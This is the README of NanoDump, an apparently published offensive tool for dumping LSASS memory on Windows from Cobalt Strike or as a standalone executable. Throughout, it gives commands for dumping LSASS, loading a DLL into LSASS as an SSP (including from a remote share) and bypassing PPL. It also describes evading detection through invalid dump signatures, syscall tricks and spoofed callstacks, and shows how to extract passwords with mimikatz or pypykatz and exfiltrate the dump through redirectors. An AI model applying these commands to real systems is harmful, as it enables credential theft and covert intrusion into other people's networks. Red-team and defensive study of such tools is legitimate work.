# NanoDump

A flexible tool that creates a minidump of the LSASS process.

![screenshot](resources/demo.png)

<h2>Table of contents</h2>

<ol>
  <li><a href="#features">Features</a></li>
  <li><a href="#usage">Usage</a></li>
  <li><a href="#fork">Process forking</a></li>
  <li><a href="#snapshot">Snapshot</a></li>
  <li><a href="#handledup">Handle duplication</a></li>
  <li><a href="#seclogon-leak-local">Seclogon handle leak local</a></li>
  <li><a href="#seclogon-leak-remote">Seclogon handle leak remote</a></li>
  <li><a href="#seclogon-duplication">Seclogon handle duplication</a></li>
  <li><a href="#ssp">Load nanodump as an SSP</a></li>
  <li><a href="#ppl">PPL bypass</a></li>
  <li><a href="#wer">WerFault</a></li>
  <li><a href="#spoof-callstack">Spoof the callstack</a></li>
  <li><a href="#params">Parameters</a></li>
  <li><a href="#examples">Examples</a></li>
  <li><a href="#redirectors">HTTPS redirectors</a></li>
</ol>

<h2 id="features">1. Features</h2>

<ul>
  <li>It uses syscalls (with <a href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a>) for most operations.</li> 
  <li>Syscalls are called from an <b>ntdll</b> address to bypass some syscall detections.</li> 
  <li>It sets the syscall callback hook to NULL.</li> 
  <li>Windows APIs are called using dynamic invoke.</li> 
  <li>You can choose to download the dump without touching disk or write it to a file.</li> 
  <li>The minidump by default has an invalid signature to avoid detection.</li> 
  <li>It reduces the size of the dump by ignoring irrelevant DLLs. The (nano)dump tends to be arround 10 MiB in size.</li> 
  <li>You don't need to provide the PID of LSASS.</li> 
  <li>No calls to <b>dbghelp</b> or any other library are made, all the dump logic is implemented in nanodump.</li> 
  <li>Supports process forking.</li> 
  <li>Supports snapshots.</li> 
  <li>Supports handle duplication.</li> 
  <li>Supports MalSecLogon.</li> 
  <li>Supports the PPL userland exploit.</li> 
  <li>You can load nanodump in LSASS as a Security Support Provider (SSP).</li> 
  <li>You can use the .exe version to run <b>nanodump</b> outside of Cobalt Strike :smile:.</li> 
</ul>

<h2 id="usage">2. Usage</h2>

<h3>Clone</h3>

```bash
git clone https://github.com/helpsystems/nanodump.git
```

<h3>Compile (optional)</h3>

<b>On Linux with MinGW</b>

```bash
make -f Makefile.mingw
```

<b>On Windows with MSVC</b> (No BOF support)

```bash
nmake -f Makefile.msvc
```

<h3>Import</h3>

Import the `NanoDump.cna` script on Cobalt Strike.


<h3>Run</h3>

Run the `nanodump` command in the Beacon console.

```
beacon> nanodump
```

<h3>Restore the signature</h3>

Once you downloaded the minidump, restore the invalid signature
```zsh
scripts/restore_signature <dumpfile>
```

<h3>Get the secretz</h3>

<b>mimikatz:</b>  
To get the secrets simply run:
```sh
mimikatz.exe "sekurlsa::minidump <dumpfile>" "sekurlsa::logonPasswords full" exit
```

<b>pypykatz:</b>  
If you prefer to stay on linux, you can use the python3 port of mimikatz called [pypykatz](https://github.com/skelsec/pypykatz).  
```sh
python3 -m pypykatz lsa minidump <dumpfie>
```

<h2 id="fork">3. Process forking</h2>

To avoid opening a handle to LSASS with `PROCESS_VM_READ`, you can use the `--fork` parameter.  
This will make nanodump create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a 'clone' of the process. This new process will then be dumped. While this will result in a process creation and deletion, it removes the need to read LSASS directly.

<h2 id="snapshot">4. Snapshot</h2>

Similarly to the `--fork` option, you can use `--snapshot` to create a snapshot of the LSASS process.  
This will make nanodump create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a snapshot of the process using `PssNtCaptureSnapshot`. This new process will then be dumped. The snapshot will be freed automatically upon completion.

<h2 id="handledup">5. Handle duplication</h2>

As opening a handle to LSASS can be detected, nanodump can instead search for existing handles to LSASS.  
If one is found, it will copy it and use it to create the minidump.  
Note that it is not guaranteed to find such handle.

<h2 id="seclogon-leak-local">6. Seclogon handle leak local</h2>

To avoid opening a handle to LSASS, you can use abuse the seclogon service by calling `CreateProcessWithLogonW` to leak an LSASS handle into the nanodump binary.  
To enable this feature, use the `--seclogon-leak-local` parameter.  
Take into account that when used from Cobalt Strike, an unsigned nanodump binary needs to be written to disk to use this feature.

<h2 id="seclogon-leak-remote">7. Seclogon handle leak remote</h2>

This technique is very similar to the previous one, but instead of leaking the handle into nanodump, it is leaked into another binary and then duplicated so that nanodump can used it.
Use the `--seclogon-leak-remote` flag to access this functionality.

<h2 id="seclogon-duplication">8. Seclogon handle duplication</h2>

You can trick the seclogon process to open a handle to LSASS and duplicate it before it is closed, by winning a race condition using file locks.
Use the `--seclogon-duplicate` flag to access this functionality.

<h2 id="ssp">9. Load nanodump as an SSP</h2>

You can load nanodump as an SSP in LSASS to avoid opening a handle. The dump will be written to disk with an invalid signature at `C:\Windows\Temp\report.docx` by default. Once the dump is completed, `DllMain` will return FALSE to make LSASS unload the nanodump DLL.  
To change the dump path and signature configuration, modify the function `NanoDump` in [entry.c](source/entry.c) and recompile.  

<h3>Upload and load a nanodump DLL</h3>

If used with no parameters, an unsigned nanodump DLL will be uploaded to the Temp folder. Once the dump has been created, manually delete the DLL with the `delete_file` command.  
```
beacon> load_ssp
beacon> delete_file C:\Windows\Temp\[RANDOM].dll
```
<h3>Load a local DLL</h3>

```
beacon> load_ssp c:\ssp.dll
```

<h3>Load a remote DLL</h3>

```
beacon> load_ssp \\10.10.10.10\openShare\ssp.dll
```


<h2 id="ppl">10. PPL bypass</h2>
If LSASS is running as Protected Process Light (PPL), you can try to bypass it using a userland exploit discovered by Project Zero. If it is successful, the dump will be written to disk.  

To access this feature, use the `nanodump_ppl` command
```
beacon> nanodump_ppl -v -w C:\Windows\Temp\lsass.dmp
```

<h2 id="wer">11. WerFault</h2>
You can force the WerFault.exe process to create a full memory dump of LSASS. Take into consideration that this requires to write to the registry

Because the dump is not made by nanodump, it will always have a valid signature.

To access this feature, use the `--werfault` parameter and the path there the dump should be created.
```
beacon> nanodump --werfault C:\Windows\Temp\
```

A dump of the nanodump process will also be created, similar to this:
```
PS C:\> dir 'C:\Windows\Temp\lsass.exe-(PID-648)-4035593\'

Directory: C:\Windows\Temp\lsass.exe-(PID-648)-4035593

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/23/2022   7:40 AM       58830409 lsass.exe-(PID-648).dmp
-a----         6/23/2022   7:40 AM        7862825 nanodump.x64.exe-(PID-3224).dmp
```

<h2 id="spoof-callstack">12. Spoof the callstack</h2>

You can open a handle to LSASS with a fake callstack, this makes the function call look a bit more legitimate.  
The offsets used in this feature, are only valid for Windows 10.0.19044.1706 (21h2), in other versions, the callstack might not look as expected. 
You can spoof the callstack of svchost, wmi and rpc.  
To access this feature, use the paramter `--spoof-callstack` with the values `svchost`, `wmi` or `rpc`.  

<h2 id="params">12. Parameters</h2>

#### --write -w < path > (required for EXE)
Where to write the dumpfile.
* **BOF**: If this parameter is not provided, the dump will be downloaded in a fileless manner.
* **EXE**: This parameter is required given that no C2 channel exists

#### --valid -v
The minidump will have a valid signature.  
If not entered, the signature will be invalid. Before analyzing the dump restore the signature of the dump, with:  
`scripts/restore_signature <dumpfile>`  

#### --fork -f
Fork LSASS and dump this new process.

#### --snapshot -s
Create a snapshot of LSASS and dump this new process.

#### --duplicate -d
Try to find an existing handle to LSASS and duplicate it.

#### --seclogon-leak-local -sll
Leak an LSASS handle into nanodump from the seclogon service  
**If used from Cobalt Strike, an unsigned binary will be written to disk**  

#### --seclogon-leak-remote -slr < binary path >
Leak an LSASS handle into the specified binary and then duplicate it.  

#### --seclogon-duplicate -sd
Force seclogon to open a handle to LSASS and duplicate it.  

#### --spoof-callstack -sc { svchost,wmi,rpc }
Call NtOpenProcess with a fake function callstack.  

#### --werfault -wf < folder >
Force WerFault to dump LSASS in the specified folder.  

#### --getpid
Get PID of LSASS and leave.  
This is just for convenience, nanodump does not need the PID of LSASS.

<h2 id="examples">13. Examples</h2>

Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:
```
beacon> nanodump --fork --write C:\lsass.dmp
```

Use the seclogon leak remote to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and download the dump  with a valid signature:
```
beacon> nanodump --seclogon-leak-remote C:\Windows\notepad.exe --fork --valid
```

Get a handle with seclogon leak local, read LSASS indirectly by using a fork and write the dump to disk with a valid signature (a nanodump binary will be uploaded!):
```
beacon> nanodump --seclogon-leak-local --fork --valid --write C:\Windows\Temp\lsass.dmp
```

Download the dump with an invalid signature (default):
```
beacon> nanodump
```

Duplicate an existing handle and write the dump to disk with an invalid signature:
```
beacon> nanodump --duplicate --write C:\Windows\Temp\report.docx
```

Get the PID of LSASS:
```
beacon> nanodump --getpid
```

Load nanodump in LSASS as an SSP (a nanodump binary will be uploaded!):
```
beacon> load_ssp
beacon> delete_file C:\Windows\Temp\[RANDOM].dll
```

Load nanodump in LSASS as an SSP remotely:
```
beacon> load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll
```

Dump LSASS bypassing PPL, duplicating the handle that csrss.exe has on LSASS:
```
beacon> nanodump_ppl --duplicate --write C:\Windows\Temp\lsass.dmp
```

Trick seclogon to open a handle to LSASS and duplicate it, then download the dump with an invalid signature:
```
beacon> nanodump --seclogon-duplicate
```

Make the WerFault.exe process create a full memory dump in the Temp folder:
```
beacon> nanodump --werfault C:\Windows\Temp\
```

Open a handle to LSASS with an invalid callstack and download the minidump with an invalid signature:
```
beacon> nanodump --spoof-callstack svchost
```

<h2 id="redirectors">14. HTTPS redirectors</h2>

If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.  
Increase the max size of requests on your web server to allow nanodump to download the dump.

#### NGINX
```
location ~ ^...$ {
    ...
    client_max_body_size 50M;
}
```
#### Apache2
```
<Directory "...">
    LimitRequestBody  52428800
</Directory>
```

## Credits
- [skelsec](https://twitter.com/skelsec) for writing [minidump](https://github.com/skelsec/minidump), which was crucial for learning the minidump file format.
- [freefirex](https://twitter.com/freefirex2) from [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) at Trustedsec for many cool tricks for BOFs
- [Jackson_T](https://twitter.com/Jackson_T) for [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2)
- [BillDemirkapi](https://twitter.com/BillDemirkapi) for [Process Forking](https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/)
- [Antonio Cocomazzi](https://twitter.com/splinter_code) for [Abusing leaked handles to dump LSASS memory](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html) and [Racing for LSASS dumps](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html)
- [xpn](https://twitter.com/_xpn_) for [Exploring Mimikatz - Part 2 - SSP](https://blog.xpnsec.com/exploring-mimikatz-part-2/)
- [Matteo Malvica](https://twitter.com/matteomalvica) for [Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/)
- [James Forshaw](https://twitter.com/tiraniddo) for [Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege](https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html)
- [itm4n](https://twitter.com/itm4n) for the original PPL userland exploit implementation, [PPLDump](https://github.com/itm4n/PPLdump).
- [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [Lsass Memory Dumps are Stealthier than Ever Before - Part 2](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2)
- [William Burgess](https://twitter.com/joehowwolf) for [Spoofing Call Stacks To Confuse EDRs](https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs)
